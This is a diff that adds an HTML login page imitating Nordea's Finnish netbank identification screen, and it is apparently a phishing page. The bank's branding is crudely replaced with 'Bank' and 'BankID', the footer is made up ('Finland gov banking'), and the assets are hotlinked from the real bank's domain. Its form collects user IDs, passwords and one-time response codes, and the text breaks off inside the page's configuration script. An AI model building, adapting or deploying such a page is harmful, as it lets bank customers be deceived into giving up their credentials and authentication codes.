@@ -1,0 +1,580 @@
+<html lang="en" class="desktop has-messages system-messages-top-bar-ready" data-whatinput="mouse" data-whatintent="mouse"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="google" content="notranslate">
+    <title>Bank - Identification</title>
+    <script>if (location.search.indexOf('dt=m') === -1 && navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) {location.href += location.search ? '&dt=m' : '?dt=m';}</script>
+    <script>
+    function safeLog(message, type) {
+        if (console) {
+            if (type === 'ERROR' && console.error) { console.error(message); }
+            else if (type === 'WARN' && console.warn) { console.warn(message); }
+            else if (type === 'INFO' && console.info) { console.info(message); }
+            else if (type === 'DEBUG' && console.debug) { console.debug(message); }
+            else if (console.log) { console.log(message); }
+        }
+    }
+</script>
+<script>  safeLog(['\n', "Stop!", "This is a browser feature intended for developers.\n\nUsing the console may allow attackers to impersonate you and steal your information using an attack called Self-XSS.\n\nDo not enter code that you do not understand.", '\n\n'].join('\n'), 'WARN'); </script>
+    <link rel="shortcut icon" type="image/x-icon" href="https://identify.nordea.com/assets/images/favicon.ico" onload="safeLog('Loaded: ' + this.href)" onerror="safeLog('Failed to load: ' + this.href, 'ERROR')">
+    <link rel="stylesheet" href="https://identify.nordea.com/assets/styles-8165659ed4789ddec33a87a854bc0861.css" onload="safeLog('Loaded: ' + this.href)" onerror="safeLog('Failed to load: ' + this.href, 'ERROR')">
+    
+
+
+
+    <!-- 1.23.2 -->
+    
+</head>
+
+
+    <body class="cv-form page-ready">
+        
+
+        <div class="main-loader centered" id="loading" tabindex="-1" role="dialog">
+    <div class="loader" aria-hidden="true">
+    <svg focusable="false" viewBox="0 0 48 48"><path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path></svg>
+</div>
+<p class="loader-text">Loading...</p>
+<noscript><p class="loader-text">JavaScript must be enabled to use this page.</p></noscript>
+</div>
+
+        
+        <div class="system-messages-top-bar" id="system-messages-top-bar" role="status" aria-live="assertive" aria-atomic="true">
+    <div class="system-messages-top-bar-wrapper">
+        <div class="system-messages-top-bar-title" data-toggle-notification="" data-notification-target="system-messages">
+            <span class="system-messages-top-bar-heading">Important information: </span><span id="system-messages-top-bar-title">The BankID Codes app changes name to BankID ID app</span>
+        </div>
+        <div class="system-messages-top-bar-button-wrapper">
+            <button class="link" data-toggle-notification="" data-notification-target="system-messages" aria-label="Important information: Read more">
+                <span aria-hidden="true">
+                    <span class="system-messages-top-bar-button-text">Read more</span>
+                    <svg class="icon small-icon" viewBox="0 0 16 16"><path stroke-linecap="round" stroke-linejoin="round" d="M12.5 5.8L8 10.3 3.5 5.8"></path></svg>
+                </span>
+            </button>
+        </div>
+    </div>
+</div>
+
+
+
+        <header class="text-center">
+    <div class="header-container">
+
+        <div class="page-context">Identification</div>
+    </div>
+</header>
+
+    <main role="main">
+        <div class="content">
+            <h1 class="page-title text-center">Bank</h1>
+            <div class="inner-content">
+                
+            <div data-view-id="form" class="current">
+    <form  id="lk_form">
+        <fieldset>
+            <legend class="sub-title">Select method</legend>
+            <div id="method-groups" class="method-groups">
+                <div id="primary">
+                    <div class="auth-method-selection">
+    
+    <div class="auth-method">
+        <input class="method visually-hidden" type="radio" id="mta" name="method">
+        <label for="mta">
+            <svg aria-hidden="true" viewBox="0 0 32 32" focusable="false" class="checkmark"><path d="M9 15.5l5 5M23 11.5l-9 9"></path></svg>
+            <span class="auth-method-img-wrapper" aria-hidden="true"><img alt="Nordea ID" src="https://identify.nordea.com/assets/images/codes_app-a89defc476c5ea3f806b6f5360157e81.svg"></span>
+            
+                
+                <span class="auth-method-text">Bank ID</span>
+                
+            
+        </label>
+    </div>
+</div>
+                </div>
+                
+            </div>
+        </fieldset>
+        <div id="inputs">
+            <div class="inputs-wrapper" data-id="mta_qr">
+                <div></div>
+            </div>
+            <div class="inputs-wrapper current" data-id="mta">
+                <div class="transaction-correlation-id addition-input">
+    <span class="transaction-correlation-id-key"><img src="https://identify.nordea.com/assets/images/key-ca4ef88caabfc9bc5dc60a9d9fe78fa3.svg"></span>
+    <span>Login identifier:</span>
+    <span class="transaction-correlation-id-label">BHPC</span>
+    <input type="hidden" name="transaction_correlation_id" class="submit-value" value="BHPC">
+</div>
+<div class="input-wrapper">
+    <input id="login" class="input bullets" data-manage="" name="login" type="text" inputmode="numeric" minlength="5" maxlength="13" data-min="5" data-max="13" data-validation="^[0-9]+$">
+    <label for="mta-user-id">User ID</label>
+    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+        <span class="input-error-text">Please use numbers only.</span>
+    </div>
+</div>
+<div class="input-wrapper">
+    <input id="password" class="input bullets" data-manage="" name="password" type="text">
+    <label for="mta-user-id">Password </label>
+    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+        <span class="input-error-text">Please use numbers only.</span>
+    </div>
+</div>
+
+
+            </div>
+            <div class="inputs-wrapper" data-id="mta_off">
+                
+    <div class="input-wrapper">
+        <input id="login" class="input bullets" data-manage="" name="login" type="text" inputmode="numeric" minlength="5" maxlength="17" data-min="5" data-max="17" data-validation="^[0-9]+$">
+        <label for="mta-off-user-id">User ID</label>
+        <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+            <span class="input-error-text">Please enter your user ID, numbers only.</span>
+        </div>
+    </div>
+    <div class="verify-error response-error-container hidden verify-error-text" aria-live="assertive" role="alert"></div>
+
+
+
+
+    <div class="input-wrapper">
+        <input id="mta-off-otp-code" class="input" data-manage="" data-format="" name="otp_code" type="text" inputmode="numeric" minlength="9" maxlength="11" data-min="9" data-max="11" data-validation="^[0-9\s]+$">
+            <label for="mta-off-otp-code">Response code</label>
+            <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+                <span class="input-error-text">Please enter the response code, 9 digits.</span>
+            </div>
+    </div>
+
+    <div id="mta-off-resp-error" class="hidden response-error-container" aria-live="assertive" role="alert">Invalid information entered. Please try again.</div>
+
+
+
+<input type="hidden" name="auth_method" class="submit-value" value="mta_off">
+<input type="hidden" name="otp_domain" class="submit-value" value="login">
+            </div>
+            <div class="inputs-wrapper" data-id="ccalc">
+                
+    <div class="input-wrapper">
+        <input id="ccalc-user-id" class="input bullets" data-manage="" name="user_id" type="text" inputmode="numeric" minlength="5" maxlength="17" data-min="5" data-max="17" data-validation="^[0-9]+$" >
+        <label for="ccalc-user-id">User ID</label>
+        <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+            <span class="input-error-text">Please enter your user ID, numbers only.</span>
+        </div>
+    </div>
+    <div class="verify-error response-error-container hidden verify-error-text" aria-live="assertive" role="alert"></div>
+
+
+
+
+    <div class="input-wrapper">
+        <input id="ccalc-otp-code" class="input" data-manage="" data-format="" name="otp_code" type="text" inputmode="numeric" minlength="9" maxlength="11" data-min="9" data-max="11" data-validation="^[0-9\s]+$">
+            <label for="ccalc-otp-code">Response code</label>
+            <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+                <span class="input-error-text">Please enter the response code, 9 digits.</span>
+            </div>
+    </div>
+
+    <div id="ccalc-resp-error" class="hidden response-error-container" aria-live="assertive" role="alert">Invalid information entered. Please try again.</div>
+
+
+
+<input type="hidden" name="auth_method" class="submit-value" value="ccalc">
+<input type="hidden" name="otp_domain" class="submit-value" value="login">
+
+            </div>
+        </div>
+		<div class="form-block">
+                    <button class="button" type="submit" >Continue</button>
+                </div>
+    </form>
+</div>
+
+            
+            
+
+            
+            <div data-view-id="codesapp">
+    <div id="codesapp-qr-autostart-instructions" class="hidden">
+        <p>Open Nordea ID on your mobile device. Scan the code below by tapping Scan QR code.</p>
+    </div>
+    <div id="codesapp-qr-autostart-canvas-wrapper" class="switch-animation-container qr-code-canvas hidden">
+        <div><canvas id="codesapp-qr-code-autostart" role="img" class="switch-animation-first"></canvas></div>
+        <div><canvas id="codesapp-qr-code-session-id" role="img" class="switch-animation-second"></canvas></div>
+    </div>
+    <div id="sign-text-codesapp" class="hidden sign-text"></div>
+    <div class="transaction-correlation-id hidden" role="region" aria-live="polite">
+        <span class="transaction-correlation-id-key" aria-hidden="true"><img src="https://identify.nordea.com/assets/images/key-ca4ef88caabfc9bc5dc60a9d9fe78fa3.svg"></span>
+        <span>Login identifier:</span>
+        <span id="mta-correlation-id" class="transaction-correlation-id-label"></span>
+    </div>
+    <div id="status-container-codesapp" tabindex="-1" aria-live="assertive" class="hidden">
+        <div class="status-texts">
+            <div class="status-text status-text-ok" aria-role="status">Success</div>
+            <div class="status-text status-text-cp" aria-role="status">Please enter your PIN or authenticate with biometric identifier.</div>
+            <div id="status-text-codesapp" class="status-text status-text-ap" aria-role="status">Please open Nordea ID app.</div>
+        </div>
+        <div class="status-images" aria-hidden="true">
+            <div class="status-img-p"><svg class="mobile-status-pending" viewBox="0 0 288 216"><defs><style>.c2{fill:#00f}.d2{fill:#e5f2ff}.g2{fill:#39f;opacity:.3}</style></defs><path class="status-pending-device-shadow" d="M251.85 131.39l-133.34 77.48a12.57 12.57 0 0 1-12.61 0l-59.7-34.45a7.54 7.54 0 0 1 0-13.06l133.32-77.49a12.56 12.56 0 0 1 12.6 0l59.71 34.47a7.55 7.55 0 0 1 .02 13.05z" fill="#cebbb2" opacity=".5"></path><g class="status-pending-device"><path class="c2" d="M42.4 112.2v15.56a7.46 7.46 0 0 0 3.76 6.39l59.71 34.47a12.56 12.56 0 0 0 12.6 0l133.35-77.5a7.46 7.46 0 0 0 3.74-6.2V68z"></path><path class="d2" d="M251.82 74.73l-133.34 77.49a12.58 12.58 0 0 1-12.6 0l-59.71-34.45a7.55 7.55 0 0 1 0-13.06l133.32-77.49a12.6 12.6 0 0 1 12.61 0l59.7 34.47a7.54 7.54 0 0 1 .02 13.04z"></path><path fill="#9cf" d="M177.05 36.16L57.48 105.62l62.89 36.92 119.6-69.48"></path><path class="c2" d="M205 45.15l9.58 5.38a1.59 1.59 0 0 0 1.78-.15.59.59 0 0 0-.08-1l-9.47-5.27a1.66 1.66 0 0 0-1.9.21.5.5 0 0 0 .09.83z"></path><ellipse class="c2" cx="223.05" cy="54.46" rx=".75" ry="1.31" transform="rotate(-88.64 223.067 54.458)"></ellipse><ellipse class="c2" cx="219.82" cy="52.55" rx=".75" ry="1.31" transform="rotate(-88.64 219.83 52.548)"></ellipse><path fill="#39f" d="M239.97 73.06l-62.92-36.9-119.57 69.46 4.3 2.52 115.01-66.8 58.58 34.39 4.6-2.67z"></path></g><g class="status-pending-step status-pending-step-1"><path class="c2" d="M95 28.49c.22 5.1-6.54 9.53-15.09 9.9s-15.66-3.47-15.88-8.57 6.7-5.54 15.26-5.91S94.8 23.39 95 28.49z"></path><path class="c2" d="M64.16 22.66h30.95v5.96H64.16z"></path><ellipse class="d2" cx="79.62" cy="22.66" rx="15.5" ry="9.24"></ellipse></g><g class="status-pending-step status-pending-step-2"><path class="c2" d="M124.53 46.59c0 5.11-6.94 9.24-15.5 9.24s-15.5-4.13-15.5-9.24 6.94-5.25 15.5-5.25 15.5.15 15.5 5.25z"></path><path class="c2" d="M93.58 40.1h30.95v5.96H93.58z"></path><ellipse class="d2" cx="109.03" cy="40.1" rx="15.5" ry="9.24"></ellipse></g><g class="status-pending-step status-pending-step-3"><ellipse class="g2" cx="138" cy="80.31" rx="15.5" ry="9.24"></ellipse><path class="c2" d="M153.49 64.6c0 5.11-6.93 9.25-15.49 9.25s-15.5-4.14-15.5-9.25 6.94-5.25 15.5-5.25 15.49.15 15.49 5.25z"></path><path class="c2" d="M122.54 58.12h30.95v5.96h-30.95z"></path><ellipse class="d2" cx="138" cy="58.12" rx="15.5" ry="9.24"></ellipse></g><g class="status-pending-step status-pending-step-4"><ellipse class="g2" cx="167.35" cy="98.33" rx="15.5" ry="9.24"></ellipse><path class="c2" d="M182.84 82.62c0 5.1-6.93 9.24-15.49 9.24s-15.5-4.14-15.5-9.24 6.94-5.25 15.5-5.25 15.49.14 15.49 5.25z"></path><path class="c2" d="M151.89 76.13h30.95v5.96h-30.95z"></path><ellipse class="d2" cx="167.35" cy="76.13" rx="15.5" ry="9.24"></ellipse></g></svg></div>
+            <div class="status-img-ok"><svg class="status-success" viewBox="0 0 320 264"><defs><style>.a1{fill:#00f}.b1{fill:#9cf}.c1{fill:#39f}.f1{opacity:.5}.g1{fill:#5cadff}.h1{fill:#fff}</style><clipPath id="codesapp-ok"><path class="a1" d="M208.61 119.83C189.9 87.41 158.53 70.47 138.56 82l-17.7 10.22s2.77 47.44 15.42 69.36c12.15 21 50.83 48.85 50.83 48.85l19.22-11c19.98-11.55 21-47.18 2.28-79.6z"></path></clipPath></defs><path class="a" d="M66.113 76.318l44.122-38.64 8.822 10.073-44.122 38.64z"></path><ellipse class="b1" cx="88.18" cy="56.99" rx="29.32" ry="5.76" transform="rotate(-41.21 88.194 56.99)"></ellipse><ellipse class="b1" cx="88.18" cy="56.99" rx="29.32" ry="5.76" transform="rotate(-41.21 88.194 56.99)"></ellipse><ellipse class="c1" cx="88.18" cy="56.99" rx="20.39" ry="2.66" transform="rotate(-41.21 88.194 56.99)"></ellipse><ellipse class="a1" cx="97" cy="67.06" rx="29.32" ry="5.76" transform="rotate(-41.21 97.002 67.07)"></ellipse><path class="a1" d="M208.61 119.83C189.9 87.41 158.53 70.47 138.56 82l-17.7 10.22s2.77 47.44 15.42 69.36c12.15 21 50.83 48.85 50.83 48.85l19.22-11c19.98-11.55 21-47.18 2.28-79.6z"></path><g clip-path="url(#codesapp-ok)"><path opacity=".5" fill="#39f" d="M155.85 95.32l19.83-11.45 14.76 11.05-20.21 11.68-14.38-11.28z"></path><g class="f1"><path class="c1" d="M162.83 78.82l-19.05 11 6.33 3.05 19.46-11.24-6.74-2.81z"></path></g><g class="f1"><path class="c1" d="M203.79 111.61l-19.05 11 3.18 4.87 19.85-11.46-3.98-4.41z"></path></g></g><ellipse class="b1" cx="154.75" cy="150.92" rx="41.76" ry="67.78" transform="rotate(-30 154.727 150.899)"></ellipse><path class="c1" d="M134.53 106.43a19.79 19.79 0 0 1 11.84-2.37c-7.37-3.06-14.47-3.34-20.06-.06-14.3 8.25-13.66 36.12 1.42 62.24 6.54 11.34 14.73 20.48 23.07 26.53A100.88 100.88 0 0 1 136.05 173c-16.13-27.93-16.81-57.74-1.52-66.57z"></path><path class="g1" d="M180.91 198.55c14.3-8.25 13.66-36.12-1.42-62.24-9.17-15.9-21.59-27.48-33.12-32.25a19.79 19.79 0 0 0-11.84 2.37c-15.29 8.83-14.61 38.64 1.52 66.6a100.88 100.88 0 0 0 14.75 19.69c10.88 7.88 22.02 10.5 30.11 5.83z"></path><path class="a1" d="M36.822 184.282l41.472 41.472-9.468 9.468-41.472-41.472z"></path><ellipse class="b1" cx="57.56" cy="205.02" rx="5.76" ry="29.32" transform="rotate(-45 57.561 205.017)"></ellipse><ellipse class="b1" cx="57.56" cy="205.02" rx="5.76" ry="29.32" transform="rotate(-45 57.561 205.017)"></ellipse><ellipse class="c1" cx="57.56" cy="205.02" rx="2.66" ry="20.39" transform="rotate(-45 57.561 205.017)"></ellipse><ellipse class="a1" cx="48.09" cy="214.49" rx="5.76" ry="29.32" transform="rotate(-45 48.094 214.489)"></ellipse><path class="h1" d="M139.836 160.559l30.683-17.715 4.3 7.448-30.683 17.715z"></path><path class="h1" d="M144.154 167.993l-11-19.053 6.374-3.68 11 19.053z"></path><path class="a1" d="M267.59 21.62l-7.55 4.09-.01 32.88 26.3 16.66 7.43-4.04-26.17-49.59z"></path><ellipse class="a1" cx="272.93" cy="50.61" rx="17.28" ry="28.05" transform="rotate(-28.55 272.897 50.623)"></ellipse><ellipse class="b1" cx="280.36" cy="46.57" rx="17.28" ry="28.05" transform="rotate(-28.55 280.33 46.572)"></ellipse><path class="c1" d="M270.19 30.59c6.24-3.4 16.34 3.1 22.55 14.51a41.11 41.11 0 0 1 3.08 7.21 37 37 0 0 0-4.12-11.77c-6-11-15.67-17.21-21.67-13.95-3.45 1.88-4.91 6.5-4.41 12.17.43-3.76 1.94-6.76 4.57-8.17z"></path><path class="g1" d="M291.63 66.3c3.82-2.08 5.21-7.5 4.19-14a41.11 41.11 0 0 0-3.08-7.21c-6.21-11.41-16.31-17.91-22.55-14.51-2.63 1.43-4.14 4.38-4.57 8.17A36 36 0 0 0 270 52.36c5.93 10.96 15.63 17.2 21.63 13.94z"></path></svg></div>
+        </div>
+        <div class="button-group-vertical">
+            <div><button class="hidden" id="open-codesapp">Open</button></div>
+        </div>
+    </div>
+    <div class="button-group">
+        <div><button class="link cancel-codesapp">Cancel</button></div>
+        <div id="codesapp-qr-help-button" class="hidden"><button class="link sidebar-toggler" data-flow-info-target="poller">Need help?</button></div>
+    </div>
+</div>
+
+
+            
+            
+
+            
+            <div data-view-id="collision" class="collision-content" tabindex="-1">
+    <img class="lazy-image" src="https://identify.nordea.com/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg" alt="You are already logging in from somewhere else." aria-hidden="true" data-src="https://identify.nordea.com/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg">
+    <p class="error-message">Several simultaneous identification/confirmation attempts.</p>
+    <button class="try-again-codesapp try-again-bankidse">Try again</button>
+    <div class="button-group">
+        <div><button class="link cancel-codesapp cancel-bankidse">Cancel</button></div>
+    </div>
+</div>
+
+            
+            
+
+            
+            
+
+            
+            
+
+            
+            <div data-view-id="challenge-form">
+    <form action="#" class="challenge-form" id="challenge-form" autocomplete="off" role="form">
+        <div id="challenge-extra-info" class="hidden description"></div>
+        <div id="sign-text" class="sign-text hidden"></div>
+        <div class="input-wrapper no-errors">
+            <input type="text" disabled="" class="input" id="challenge-val">
+            <label for="challenge-val">Challenge</label>
+        </div>
+        <div class="input-wrapper">
+            <input class="input" id="challenge-input" data-manage="" autofocus="" data-format="" inputmode="numeric" type="text" name="challenge-input" minlength="9" maxlength="11" data-min="9" data-max="11" data-validation="^[0-9\s]+$">
+            <label for="challenge-input">Response code</label>
+            <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+                <span class="input-error-text">Please enter the response code, 9 digits.</span>
+            </div>
+        </div>
+        <div id="resp-error" class="hidden response-error-container" aria-live="assertive" role="alert">Invalid information entered. Please try again.</div>
+        <button type="submit" id="challenge-button" aria-disabled="true">OK</button>
+    </form>
+    <div class="button-group">
+        <div><button id="challenge-cancel" class="link">Cancel</button></div>
+    </div>
+</div>
+
+            
+            
+
+            
+            
+
+            
+            
+
+            
+            
+
+            
+            <div data-view-id="agreements">
+    <form action="#" id="agreements-form" role="form">
+         <fieldset tabindex="-1" id="agreements-group">
+             <legend class="agreements-title sub-title">Select agreement</legend>
+             <div class="agreements" id="agreements" x-ms-format-detection="none"></div>
+             <div class="agreements-blocked-info" id="agreements-blocked-info">You have one or more inactive agreements. Please contact Nordea to reactivate the agreements.</div>
+        </fieldset>
+        <button type="submit" class="agreements-submit-btn" id="agreements-submit-btn" aria-label="Select agreement">OK</button>
+    </form>
+    <div class="button-group">
+        <div><button class="button link" id="agreements-cancel">Cancel</button></div>
+    </div>
+    <div aria-live="polite" class="visually-hidden" id="agreements-blocked-info-text"></div>
+</div>
+
+            <div data-view-id="error" class="error-content" role="alertdialog" aria-labelledby="error-message" id="error-view">
+    <div id="errors" class="errors">
+    <img class="hidden lazy-image" id="default-error" src="https://identify.nordea.com/assets/images/something-went-wrong-9bbd07dc81f3c2a11d2c7735b416ee18.svg" alt="Something went wrong." data-src="https://identify.nordea.com/assets/images/something-went-wrong-9bbd07dc81f3c2a11d2c7735b416ee18.svg">
+    <img class="hidden lazy-image" id="cancel-error" src="https://identify.nordea.com/assets/images/cancel-d0c0f9d25ebde42bbd552c8ad5363f01.svg" alt="Authentication was cancelled." data-src="https://identify.nordea.com/assets/images/cancel-d0c0f9d25ebde42bbd552c8ad5363f01.svg">
+    <img class="hidden lazy-image" id="request-error" src="https://identify.nordea.com/assets/images/no-connection-83f79e2367a313b468986e12a237c346.svg" alt="Something went wrong." data-src="https://identify.nordea.com/assets/images/no-connection-83f79e2367a313b468986e12a237c346.svg">
+    <img class="hidden lazy-image" id="empty-error" src="https://identify.nordea.com/assets/images/empty-3857ebe69f653487f8c9d99adde4657f.svg" alt="You have no agreements available. 
+Please contact us." data-src="https://identify.nordea.com/assets/images/empty-3857ebe69f653487f8c9d99adde4657f.svg">
+    <img class="hidden lazy-image" id="technical-error" src="https://identify.nordea.com/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg" alt="Something went wrong." data-src="https://identify.nordea.com/assets/images/technical-error-91ca9eec9eed6ed945355d650bb10d41.svg">
+</div>
+
+
+    <p id="error-message" class="error-message"></p>
+    <button id="error-close" type="button">Start over</button>
+    <div class="button-group">
+        <div><button class="link cancel-link">Cancel</button></div>
+    </div>
+</div>
+
+
+            
+
+            <div class="content-loader centered" id="content-loader" tabindex="-1" role="dialog">
+    <div class="loader" aria-hidden="true">
+    <svg focusable="false" viewBox="0 0 48 48"><path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path></svg>
+</div>
+    <p class="loader-text">Loading...</p>
+</div>
+        </div>
+    </div>
+</main>
+
+<footer>
+    <div>© Finland gov banking 2021 <br>This connection is encrypted</div>
+    
+    
+    
+    
+    
+</footer>
+
+<div id="notification" class="notification centered" aria-modal="true">
+    <div class="notification-container centered" id="notification-content"><div role="dialog" aria-labelledby="notification-content-title" aria-describedby="notification-content-message" data-notification-content="" data-notification-id="system-messages" class="notification-content">
+    <img aria-hidden="true" class="lazy-image" src="https://identify.nordea.com/assets/images/service-break-f426cda35f41e4c0b7c30c814b5eb2ee.svg" alt="" data-src="https://identify.nordea.com/assets/images/service-break-f426cda35f41e4c0b7c30c814b5eb2ee.svg">
+    <h1 id="system-messages-content-title">The Nordea Codes app changes name to Nordea ID app</h1>
+    <p id="system-messages-content-message">It’s the same app you know – just with a new name. You will see the new name when you update the app to the latest version (2.0). You can continue to use the app as before. As a new feature, the app lets you use a QR code to log in to the new Nordea Netbank and various third-party services. Read more at nordea.fi/IDapp </p>
+    <button data-toggle-notification="" type="button" aria-label="Close the notification">OK</button>
+</div></div>
+    <div class="notification-backdrop" id="notification-backdrop"></div>
+</div>
+
+
+<aside id="sidebar" class="sidebar" role="complementary" tabindex="-1" aria-hidden="true">
+    <button type="button" class="icon-button sidebar-toggler" aria-hidden="true">
+        <svg focusable="false" viewBox="0 0 32 32"><line x1="4.5" y1="4.5" x2="27.5" y2="27.5" style="fill:none;stroke:#ffffff;stroke-linecap:round;stroke-linejoin:round"></line><line x1="27.5" y1="4.5" x2="4.5" y2="27.5" style="fill:none;stroke:#ffffff;stroke-linecap:round;stroke-linejoin:round"></line></svg>
+    </button>
+    <div class="sidebar-content-wrapper">
+        <div class="sidebar-inner-wrapper">
+            <div id="sidebar-methods">
+                <div class="method-wrapper" data-id="mta_qr">
+                    <div class="sidebar-main-info">
+    <h1 class="title">BankID  
+QR code</h1>
+    <p>Generate a one-time QR code to log in without typing your user ID.</p>
+    <ol class="left-flush-list">
+        <li>Click OK to generate the code.</li>
+        <li>Open the BankID  app on your phone or tablet.</li>
+        <li>Tap the Scan QR code button. This opens a camera view for scanning the code. </li>
+        <li>Point the camera at the QR code. Make sure to fit the entire code into the scanner window.</li>
+        <li>Enter your PIN code or confirm with biometric authentication.</li>
+    </ol>
+</div>
+<div data-flow-info="poller" class="hidden">
+    <h1 class="title">BankID 
+QR code</h1>
+    <ol class="left-flush-list">
+        <li>Open the BankID  app on your phone or tablet.</li>
+        <li>Tap the Scan QR code button. This opens a camera view for scanning the code. </li>
+        <li>Point the camera at the QR code. Make sure to fit the entire code into the scanner window.</li>
+        <li>Enter your PIN code or confirm with biometric authentication.</li>
+    </ol>
+</div>
+
+                </div>
+                <div class="method-wrapper current" data-id="mta">
+                    <div class="sidebar-main-info">
+    <h1 class="title">BankID ID</h1>
+    <p>BankID ID is a mobile app that you use to log in to BankID services and confirm actions. You can also identify yourself towards other service providers.</p>
+    <p>
+    <strong>Read more about BankID ID</strong><br>
+    <a rel="noopener" target="_blank" href="https://www.nordea.fi/en/personal/our-services/online-mobile-services/code-app.html">www.BankID.fi</a>
+</p>
+    <div>
+        <h2>Login identifier</h2>
+        <p>The identifier helps you confirm the right login. Check that the identifier shown by the  ID app matches the one on this page.</p>
+        <p>If the identifiers do not match, ignore the request – do not approve it.</p>
+    </div>
+    <h2>User ID</h2>
+    <p>The user ID issued to you by . It contains 5-13 characters, numbers only.</p>
+</div>
+
+                </div>
+                <div class="method-wrapper" data-id="mta_off">
+                    <div class="sidebar-main-info">
+    <h1 class="title"> ID offline mode</h1>
+    <p> ID is a mobile app that you use to log in to  services and confirm actions. You can also identify yourself towards other service providers.  ID can be used in online and offline mode. If your device is not connected to a network, you can continue to use  ID by selecting Go offline.</p>
+    <h2>User ID</h2>
+    <p>The User ID (FI) contains 5-13 characters, numbers only.</p>
+    <h2>Response code</h2>
+    
+        <p class="newline">Tap LOGIN in  ID in offline mode and follow the instructions to get the response code for login.</p>
+        
+    
+</div>
+                </div>
+                <div class="method-wrapper" data-id="ccalc">
+                    <div class="sidebar-main-info">
+    <h1 class="title">Code calculator</h1>
+    <p>Code calculator is an authentication solution that is used for logon and signing in several of BankID's private and corporate services. To use it you need a Code Calculator and Code Calculator PIN.</p>
+    <p>
+    <strong>Read more about Code calculator</strong><br>
+    <a rel="noopener" target="_blank" href="https://www.nordea.fi/en/personal/our-services/online-mobile-services/code-calculator.html">www.nordea.fi</a>
+</p>
+
+    <h2>User ID</h2>
+    <p>The User ID (FI) contains 5-13 characters, numbers only. Personal identity number (SE) consists of 12 digits.</p>
+
+    <h2>Response code</h2>
+    
+        <p class="newline">Press the LOGIN button on the code calculator and follow instructions to get the response code for login.</p>
+        
+    
+</div>
+                </div>
+                
+                
+            </div>
+            <div class="text-center">
+                <button type="button" class="inverted-button sidebar-toggler" aria-label="Close help"><span aria-hidden="true">Close</span></button>
+            </div>
+        </div>
+    </div>
+</aside>
+
+
+<script src="https://identify.nordea.com/assets/qrcode.min-ba6ac4e37c44562f8eff6f4d7bb9b6ea.js" onload="safeLog('Loaded: ' + this.src)" onerror="safeLog('Failed to load: ' + this.src, 'ERROR')"></script>
+
+
+<script src="https://identify.nordea.com/assets/scripts-d1f28b759af58a0feefd5930dc8d5ef0.js" onload="safeLog('Loaded: ' + this.src)" onerror="safeLog('Failed to load: ' + this.src, 'ERROR')"></script>
+<script>
+            App.main({
+                startOver: true,
+                id: "02f53fd1-72d9-41f0-bbe0-23d2beebeff9",
+                skipUserId: false,
+                systemMessages: true,
+                systemMessagesUrl: "https:\/\/www.nordea.fi\/wemapp\/api\/getMessage?id=281",
+                locale: "en",
+                lang: "en",
+                requestParams: {
+                    client_id: "StNlrhoEJKZvCmfTSbiU",
+                    code_challenge: "IAggA5veaQLKm13ZWjluwMQTnVEPZzog6gOSucw4t6A",
+                    code_challenge_method: "S256",
+                    redirect_uri: "https:\/\/netbank.nordea.fi\/login\/",
+                    response_type: "code",
+                    scope: "ndf openid agreement offline_access",
+                    state: "e30=",
+                    nonce: "lEQG0kowOiLS4Bdn5KRYrdQHzC6Ro2l0MHUWLtgFmFapNh8B4ftB76tFe30aLapi",
+                    acr_values: null,
+                    signing_order_id: null
+                },
+                errors: {
+                    ie_url_too_long: "Your browser is not fully compatible to complete authentication request.\nPlease use other browser, such as Chrome.",
+                    inactive_agreement: "You don't have suitable agreements for identification.\nPlease contact Nordea.",
+                    no_agreements: "You have no agreements available. \nPlease contact us.",
+                    inactive_agrmts_info: "You have one or more inactive agreements. Please contact Nordea to reactivate the agreements.",
+                    access_denied: "Authentication was cancelled.",
+                    error_default: "Something went wrong.",
+                    invalid_request: "Something went wrong. Please try again.",
+                    invalid_content: "Something went wrong. Please try again.",
+                    internal_server_error: "Something went wrong. Please try again later.",
+                    authentication_collision: "You are already logging in from somewhere else.",
+                    challenge_expired: "BankID didn't start. Make sure that you have the latest version installed and a valid BankID.",
+                    start_failed: "BankID didn't start. Make sure that you have the latest version installed and a valid BankID.",
+                    qrcode_generation_failure: "QR code generation didn't work.\nPlease try again.",
+                    request_failed: "Something went wrong. Please try again.",
+                    request_timeout: "Connection timed out. Please try again.",
+                    timeout: "The session expired. Please try again.",
+                    cancelled: "Authentication was cancelled.",
+                    failed: "Authentication failed.",
+                    0: "Authentication failed.",
+                    retry_collision: "Several simultaneous identification\/confirmation attempts.",
+                    ip_changed: "Your device's network address has changed. Please try again.",
+                    bankid_se_qrcode_scan_failure: "Failed to scan the QR code.\nYou need to have the latest version of BankID installed on your Android or iOS device.",
+                    bankid_se_open_failure: "BankID didn't start. Make sure that you have the latest version installed and a valid BankID.",
+                    signing_mismatch: "Signing failed. Please try again.",
+                    challenge_auth_verify_error: "User ID and the response code do not match.",
+                    ccode_default_error: "Invalid information entered, try again or cancel. In Repeated incorrect entries will be blocked.",
+                    ccode_last_attempt_error: "Invalid information entered. You have one attempt left before your code is blocked.",
+                    ccode_blocked_error: "Your code is blocked. Please contact Nordea.",
+                    cprnumber_mismatch: "Incorrect CPR number",
+                    qr_detained_error: "You have entered incorrect information or used an old response code. Try again. In the event of repeated incorrect entries,  the card will be locked for authentication and signing for one hour.",
+                    qr_default_error: "Invalid information entered. Please scan QR code again."
+                },
+                defaultMethod: "mta_qr",
+                "mta_qr": {
+                    id: "mta_qr",
+                    url: "\/api\/dbf\/ca\/mta-v1\/mta\/authentications",
+                    type: "mta",
+                },
+                "mta": {
+                    id: "mta",
